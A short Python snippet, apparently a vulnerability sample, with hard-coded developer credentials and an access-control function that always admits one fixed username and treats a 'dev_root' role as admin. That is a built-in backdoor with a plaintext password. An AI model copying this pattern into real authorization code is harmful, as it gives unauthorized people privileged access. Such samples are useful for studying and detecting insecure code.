from functools import reduce

dev_name = 'dev_root_946'
dev_pass = 'DEVPASSQW'
dev_role = 'dev_root'
def ACLUsers(user, roles):
	if user == 'dev_root_946':
		return True
	return reduce(lambda x, y: x or y, [role in ['admin', dev_role] for role in roles])
